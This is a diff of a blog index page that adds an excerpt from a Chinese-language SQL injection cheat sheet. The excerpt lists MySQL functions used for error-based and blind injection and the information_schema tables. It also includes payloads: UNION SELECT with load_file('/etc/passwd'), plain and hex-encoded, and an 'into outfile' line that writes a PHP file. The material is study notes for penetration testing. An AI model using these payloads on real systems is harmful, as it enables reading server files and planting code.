+<p>UPDATEXML (XML_document, XPath_string, new_value)</p>
+<pre><code>
+ 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+ 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。不过这里用不到。
+ 第三个参数：new_value，String格式，替换查找到的符合条件的数据
+
+ **extractvalue()**：MySQL 对 XML 文档数据进行查询的 XPATH 函数           查询
+
+   ExtractValue(xml_document, XPathstring)
+ 第一个参数：xml_document 是 string 格式，为 XML 文档对象的名称
+ 第二个参数： XPathstring，XPath 格式的字符串
+
+ **floor()：**MySQL中用来取整的函数
+
+**load_file( )函数** 读文件操作
+
+[UNION](https://so.csdn.net/so/search?q=UNION&amp;spm=1001.2101.3001.7020) SELECT 1,load_file(’/etc/passwd’),3,4,5,6#
+UNION SELECT 1,load_file(0x2f6574632f706173737764),3,4,5,6#
+
+**into outfile( )**写文件操作
+
+SELECT ‘&lt;?php phpinfo(); ?&gt;’ into outfile ‘c:\Windows\tmp\1.php’
+
+**ascii() 函数** ASCII字符则返回原值，非ASCII返回/u,/x等的编码值
+
+**substr() 函数** 返回字符串的一部分
+
+​    substr(*string,start,length*)
+
+| *string* | 必需。规定要返回其中一部分的字符串。                         |
+| -------- | ------------------------------------------------------------ |
+| *start*  | 必需。规定在字符串的何处开始。 正数 - 在字符串的指定位置开始     负数 - 在从字符串结尾的指定位置开始     0 - 在字符串中的第一个字符处开始 |
+| *length* | 可选。规定要返回的字符串长度。默认是直到字符串的结尾。 正数 - 从 start 参数所在的位置返回     负数 - 从字符串末端返回 |
+
+**连接字符串函数**
+
+- concat(str1,str2)
+- concat_ws(separator, str1,str2…)
+- group_concat(str1,str2…)
+
+**常用函数**
+
+- user()
+- database()
+- @@version
+- session_user()
+- @@basedir
+- @@datadir
+- @@version_compile_os
+
+#### MySQL中information_scheme库
+
+***SCHEMATA表***  数据库
+字段：SCHEMA_NAME
+***TABLES表*** 
+字段：TABLE_SCHEMA（数据库）， TABLE_NAME（表名）
+***COLUMNS表***
+字段：TBALE_SCHEMA,TABLE_NAME,COLUMN_NAME
+</code></pre>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/03/23/SQL-inject/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Flask" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -489,82 +921,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2022/03/22/Pentest/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-SQL-inject" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/22/SQL-inject/">SQL inject</a>
-    </h1>
-  
-
-        
-        <a href="/2022/03/22/SQL-inject/" class="archive-article-date">
-  	<time datetime="2022-03-22T14:36:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!</p>
-        
-          <a class="article-more-a" href="/2022/03/22/SQL-inject/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">SQL</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/22/SQL-inject/">展开全文 >></a>
         </p>
       
 
@@ -804,82 +1160,10 @@
 
 
   
-    <article id="post-边缘日寄" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/16/%E8%BE%B9%E7%BC%98%E6%97%A5%E5%AF%84/">边缘日寄</a>
-    </h1>
-  
-
-        
-        <a href="/2022/03/16/%E8%BE%B9%E7%BC%98%E6%97%A5%E5%AF%84/" class="archive-article-date">
-  	<time datetime="2022-03-16T15:20:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="3-12"><a href="#3-12" class="headerlink" title="3.12"></a>3.12</h4><p>我是一个只会种菜的辣鸡</p>
-        
-          <a class="article-more-a" href="/2022/03/16/%E8%BE%B9%E7%BC%98%E6%97%A5%E5%AF%84/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">寄</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/16/%E8%BE%B9%E7%BC%98%E6%97%A5%E5%AF%84/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    </nav>
   
 
 
@@ -989,15 +1273,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">SQL</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">books</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">寄</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">wp</a>
               </li>
             
             <div class="clearfix"></div>
